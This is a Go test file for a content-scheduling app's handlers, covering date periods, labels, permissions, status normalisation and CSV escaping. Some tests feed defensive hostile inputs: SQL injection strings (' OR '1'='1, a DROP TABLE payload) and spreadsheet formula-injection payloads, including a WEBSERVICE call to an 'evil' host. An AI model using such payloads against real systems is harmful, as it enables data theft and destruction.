package handlers

import (
	"testing"
)

func TestGetPeriodDateRange_Monthly(t *testing.T) {
	tests := []struct {
		name     string
		year     int
		period   int
		wantFrom string
		wantTo   string
	}{
		{"January", 2025, 1, "2025-01-01", "2025-01-31"},
		{"February non-leap", 2025, 2, "2025-02-01", "2025-02-28"},
		{"February leap", 2024, 2, "2024-02-01", "2024-02-29"},
		{"March", 2025, 3, "2025-03-01", "2025-03-31"},
		{"April", 2025, 4, "2025-04-01", "2025-04-30"},
		{"May", 2025, 5, "2025-05-01", "2025-05-31"},
		{"June", 2025, 6, "2025-06-01", "2025-06-30"},
		{"July", 2025, 7, "2025-07-01", "2025-07-31"},
		{"August", 2025, 8, "2025-08-01", "2025-08-31"},
		{"September", 2025, 9, "2025-09-01", "2025-09-30"},
		{"October", 2025, 10, "2025-10-01", "2025-10-31"},
		{"November", 2025, 11, "2025-11-01", "2025-11-30"},
		{"December", 2025, 12, "2025-12-01", "2025-12-31"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotFrom, gotTo := getPeriodDateRange(tt.year, "monthly", tt.period)
			if gotFrom != tt.wantFrom {
				t.Errorf("getPeriodDateRange(%d, monthly, %d) gotFrom = %q, want %q", tt.year, tt.period, gotFrom, tt.wantFrom)
			}
			if gotTo != tt.wantTo {
				t.Errorf("getPeriodDateRange(%d, monthly, %d) gotTo = %q, want %q", tt.year, tt.period, gotTo, tt.wantTo)
			}
		})
	}
}

func TestGetPeriodDateRange_Semester(t *testing.T) {
	tests := []struct {
		name     string
		year     int
		period   int
		wantFrom string
		wantTo   string
	}{
		{"Semester 1", 2025, 1, "2025-01-01", "2025-06-30"},
		{"Semester 2", 2025, 2, "2025-07-01", "2025-12-31"},
		{"Semester 1 leap year", 2024, 1, "2024-01-01", "2024-06-30"},
		{"Semester 2 leap year", 2024, 2, "2024-07-01", "2024-12-31"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotFrom, gotTo := getPeriodDateRange(tt.year, "semester", tt.period)
			if gotFrom != tt.wantFrom {
				t.Errorf("getPeriodDateRange(%d, semester, %d) gotFrom = %q, want %q", tt.year, tt.period, gotFrom, tt.wantFrom)
			}
			if gotTo != tt.wantTo {
				t.Errorf("getPeriodDateRange(%d, semester, %d) gotTo = %q, want %q", tt.year, tt.period, gotTo, tt.wantTo)
			}
		})
	}
}

func TestGetPeriodDateRange_Boundaries(t *testing.T) {
	// Boundary: 30 June / 1 July (semester split)
	from, to := getPeriodDateRange(2025, "semester", 1)
	if to != "2025-06-30" {
		t.Errorf("S1 end = %q, want 2025-06-30", to)
	}
	from2, _ := getPeriodDateRange(2025, "semester", 2)
	if from2 != "2025-07-01" {
		t.Errorf("S2 start = %q, want 2025-07-01", from2)
	}
	if from >= from2 {
		t.Error("S1 start should be before S2 start")
	}

	// Boundary: 31 Dec / 1 Jan (year boundary)
	_, dec31 := getPeriodDateRange(2025, "monthly", 12)
	jan1, _ := getPeriodDateRange(2026, "monthly", 1)
	if dec31 != "2025-12-31" {
		t.Errorf("Dec 2025 end = %q, want 2025-12-31", dec31)
	}
	if jan1 != "2026-01-01" {
		t.Errorf("Jan 2026 start = %q, want 2026-01-01", jan1)
	}
}

func TestGetPeriodDateRange_InvalidPeriod(t *testing.T) {
	// Period too low → clamped to 1
	from, _ := getPeriodDateRange(2025, "monthly", 0)
	if from != "2025-01-01" {
		t.Errorf("period 0 gotFrom = %q, want 2025-01-01", from)
	}

	// Period too high → clamped to 12
	_, to := getPeriodDateRange(2025, "monthly", 99)
	if to != "2025-12-31" {
		t.Errorf("period 99 gotTo = %q, want 2025-12-31", to)
	}

	// Invalid semester → fallback to S2 (any period != 1 defaults to S2)
	from, _ = getPeriodDateRange(2025, "semester", 99)
	if from != "2025-07-01" {
		t.Errorf("semester 99 gotFrom = %q, want 2025-07-01 (S2 fallback)", from)
	}
}

func TestPeriodLabel(t *testing.T) {
	tests := []struct {
		year   int
		mode   string
		period int
		want   string
	}{
		{2025, "monthly", 1, "Januari 2025"},
		{2025, "monthly", 6, "Juni 2025"},
		{2025, "monthly", 12, "Desember 2025"},
		{2025, "semester", 1, "Semester 1 2025"},
		{2025, "semester", 2, "Semester 2 2025"},
	}

	for _, tt := range tests {
		got := periodLabel(tt.year, tt.mode, tt.period)
		if got != tt.want {
			t.Errorf("periodLabel(%d, %q, %d) = %q, want %q", tt.year, tt.mode, tt.period, got, tt.want)
		}
	}
}

func TestFmtPercent(t *testing.T) {
	tests := []struct {
		input float64
		want  string
	}{
		{0.0, "0.00"},
		{50.0, "50.00"},
		{100.0, "100.00"},
		{33.333, "33.33"},
		{66.666, "66.67"},
	}

	for _, tt := range tests {
		got := fmtPercent(tt.input)
		if got != tt.want {
			t.Errorf("fmtPercent(%v) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestSemesterKey(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"2025-01-15", "2025-S1"},
		{"2025-06-30", "2025-S1"},
		{"2025-07-01", "2025-S2"},
		{"2025-12-31", "2025-S2"},
		{"2024-02-29", "2024-S1"},
		{"2024-08-17", "2024-S2"},
		{"", ""},
		{"short", "short"},
	}

	for _, tt := range tests {
		if got := semesterKey(tt.input); got != tt.want {
			t.Errorf("semesterKey(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestSemesterLabel(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"2025-S1", "Semester 1 2025"},
		{"2025-S2", "Semester 2 2025"},
		{"2024-S1", "Semester 1 2024"},
		{"2024-S2", "Semester 2 2024"},
		{"", ""},
		{"2025", "2025"},
	}

	for _, tt := range tests {
		if got := semesterLabel(tt.input); got != tt.want {
			t.Errorf("semesterLabel(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestAtoiSafe(t *testing.T) {
	// Valid
	v, err := atoiSafe("2025")
	if err != nil || v != 2025 {
		t.Errorf("atoiSafe(\"2025\") = %d, %v, want 2025, nil", v, err)
	}

	// With spaces
	v, err = atoiSafe("  2025  ")
	if err != nil || v != 2025 {
		t.Errorf("atoiSafe(\"  2025  \") = %d, %v, want 2025, nil", v, err)
	}

	// Invalid
	_, err = atoiSafe("abc")
	if err == nil {
		t.Error("atoiSafe(\"abc\") should return error")
	}
}

func TestDerefStringPtr(t *testing.T) {
	// Nil pointer
	if got := derefStringPtr(nil); got != "" {
		t.Errorf("derefStringPtr(nil) = %q, want %q", got, "")
	}

	// Non-nil pointer
	s := "hello"
	if got := derefStringPtr(&s); got != "hello" {
		t.Errorf("derefStringPtr(&\"hello\") = %q, want \"hello\"", got)
	}
}

func TestBuildTopicRecap(t *testing.T) {
	counts := map[string]int{
		"A - Bencana & Pemulihan":                       3,
		"B - TJSL":                                      2,
		"Q - Penokohan":                                 5,
		"Edukasi (Educational)":                         3,
		"Hiburan (Entertainment)":                       2,
		"Promosi (Promotional)":                         1,
		"Di Balik Layar (Behind the Scenes)":            1,
		"Interaksi & Komunitas (Engagement)":            1,
		"Solusi Masalah & FAQ (Problem Solving / Help)": 1,
	}

	rows := buildTopicRecap(counts)

	// Coded rows sorted A–Z, uncoded merged into one "?" row at the end.
	wantCodes := []string{"A", "B", "Q", "?"}
	if len(rows) != len(wantCodes) {
		t.Fatalf("buildTopicRecap() returned %d rows (%+v), want %d", len(rows), rows, len(wantCodes))
	}
	for i, want := range wantCodes {
		if rows[i].Code != want {
			t.Errorf("rows[%d].Code = %q, want %q", i, rows[i].Code, want)
		}
	}

	uncoded := rows[3]
	if uncoded.Topic != "Tanpa Kode" {
		t.Errorf("uncoded row Topic = %q, want %q", uncoded.Topic, "Tanpa Kode")
	}
	if want := 3 + 2 + 1 + 1 + 1 + 1; uncoded.Count != want {
		t.Errorf("uncoded row Count = %d, want %d", uncoded.Count, want)
	}
	if rows[0].Topic != "Bencana & Pemulihan" || rows[0].Count != 3 {
		t.Errorf("rows[0] = %+v, want code A with Topic %q and Count 3", rows[0], "Bencana & Pemulihan")
	}

	// Total content count must be preserved.
	total := 0
	for _, r := range rows {
		total += r.Count
	}
	if want := 3 + 2 + 5 + 3 + 2 + 1 + 1 + 1 + 1; total != want {
		t.Errorf("total count = %d, want %d", total, want)
	}
}

func TestBuildTopicRecap_SameCodeMerged(t *testing.T) {
	counts := map[string]int{
		"A - Satu": 1,
		"A-Dua":    2, // matches the regex too ("A-Dua" -> code A, topic "Dua")
		"B - X":    3,
	}
	rows := buildTopicRecap(counts)

	if len(rows) != 2 {
		t.Fatalf("got %d rows (%+v), want 2", len(rows), rows)
	}
	if rows[0].Code != "A" || rows[0].Count != 3 || rows[0].Topic != "Satu, Dua" {
		t.Errorf("rows[0] = %+v, want code A, Count 3, Topic %q", rows[0], "Satu, Dua")
	}
}

func TestBuildTopicRecap_Empty(t *testing.T) {
	if rows := buildTopicRecap(map[string]int{}); len(rows) != 0 {
		t.Errorf("buildTopicRecap(empty) = %+v, want empty slice", rows)
	}
}

func TestNormalizePubStatus(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		// Canonical statuses pass through
		{"PLANNED", "PLANNED"},
		{"PUBLISHED", "PUBLISHED"},
		{"DELAYED", "DELAYED"},
		{"CANCELLED", "CANCELLED"},
		// Aliases are normalized
		{"DELAY", "DELAYED"},
		{"CANCEL", "CANCELLED"},
		// Anything else is rejected (case-sensitive, no free-form values)
		{"DADAKTAKBAKU", ""},
		{"published", ""},
		{"", ""},
		{"' OR '1'='1", ""},
	}

	for _, tt := range tests {
		if got := normalizePubStatus(tt.input); got != tt.want {
			t.Errorf("normalizePubStatus(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestPublishableContentStatuses(t *testing.T) {
	allowed := []string{"APPROVED", "READY_TO_PUBLISH", "PUBLISHED"}
	for _, s := range allowed {
		if !publishableContentStatuses[s] {
			t.Errorf("publishableContentStatuses[%q] = false, want true (matches MARK_PUBLISHED rule)", s)
		}
	}

	// Statuses that must NOT allow a publish shortcut (workflow lock states
	// and pre-approval states).
	blocked := []string{"DRAFT", "IN_PROGRESS", "PENDING_REVIEW", "REVISION_REQUIRED"}
	for _, s := range blocked {
		if publishableContentStatuses[s] {
			t.Errorf("publishableContentStatuses[%q] = true, want false — this would bypass the approval chain", s)
		}
	}
}

func TestCanModifyContent(t *testing.T) {
	owner := "user-a"
	other := "user-b"
	createdBy := &owner

	tests := []struct {
		name      string
		role      string
		createdBy *string
		userID    string
		want      bool
	}{
		{"ADMIN selalu boleh", "ADMIN", createdBy, other, true},
		{"ADMIN bahkan tanpa creator", "ADMIN", nil, other, true},
		{"STAFF pemilik konten", "STAFF", createdBy, owner, true},
		{"STAFF bukan pemilik", "STAFF", createdBy, other, false},
		{"STAFF konten legacy tanpa creator", "STAFF", nil, other, true},
		{"role kosong dianggap STAFF — bukan pemilik", "", createdBy, other, false},
		{"role kosong dianggap STAFF — pemilik", "", createdBy, owner, true},
	}

	for _, tt := range tests {
		if got := canModifyContent(tt.role, tt.createdBy, tt.userID); got != tt.want {
			t.Errorf("%s: canModifyContent(%q, %v, %q) = %v, want %v",
				tt.name, tt.role, tt.createdBy, tt.userID, got, tt.want)
		}
	}
}

func TestRescheduleDateValidation(t *testing.T) {
	// parseDateStr adalah validator tanggal yang dipakai RescheduleTabungan;
	// nilai yang lolos adalah yang valid masuk kolom date.
	valid := []string{"2026-09-15", "2026-12-31", "2026-01-01T10:00:00Z"}
	for _, v := range valid {
		if _, ok := parseDateStr(v); !ok {
			t.Errorf("parseDateStr(%q) = invalid, want valid", v)
		}
	}

	invalid := []string{"", "bukan-tanggal", "15/09/2026", "'; DROP TABLE contents;--", "2026-13-45"}
	for _, v := range invalid {
		if _, ok := parseDateStr(v); ok {
			t.Errorf("parseDateStr(%q) = valid, want invalid", v)
		}
	}
}

func TestCsvEscape_FormulaInjection(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		// Benign values pass through untouched
		{"Konten biasa", "Konten biasa"},
		{"Normal text", "Normal text"},
		{"123", "123"},

		// Formula injection payloads are neutralized with a leading single quote;
		// when the cell also contains comma/quote/newline it is quoted per RFC 4180.
		{`=WEBSERVICE("http://evil/")`, `"'=WEBSERVICE(""http://evil/"")"`},
		{"+SUM(A1:A10)", "'+SUM(A1:A10)"},
		{"-1+2", "'-1+2"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\tHYPERLINK(...)", "'\tHYPERLINK(...)"},
		{"\rCMD", "\"'\rCMD\""},

		// Comma/quote escaping still works AND formula prefix preserved
		{"=cmd,batch", `"'=cmd,batch"`},
		{`="injection"`, `"'=""injection"""`},
	}
	for _, tt := range tests {
		if got := csvEscape(tt.input); got != tt.want {
			t.Errorf("csvEscape(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestImportWhitelists_CoverKnownValues(t *testing.T) {
	// Ensure the execute-path whitelists match the validate-path expectations.
	for f := range validFormats {
		if !validFormats[f] {
			t.Errorf("validFormats[%q] inconsistent", f)
		}
	}
	if !validFormats["Carousel"] || !validFormats["Story"] {
		t.Error("validFormats missing standard entries")
	}
	if validFormats["Malicious"] {
		t.Error("validFormats should not accept arbitrary values")
	}

	for _, p := range []string{"EDUCATION", "ENTERTAINMENT", "INSPIRATIONAL", "PROMOTION", "INFORMATION"} {
		if validPurposes[p] != p {
			t.Errorf("validPurposes[%q] = %q, want %q", p, validPurposes[p], p)
		}
	}
	if _, ok := validPurposes["EVIL"]; ok {
		t.Error("validPurposes should not accept arbitrary values")
	}
}
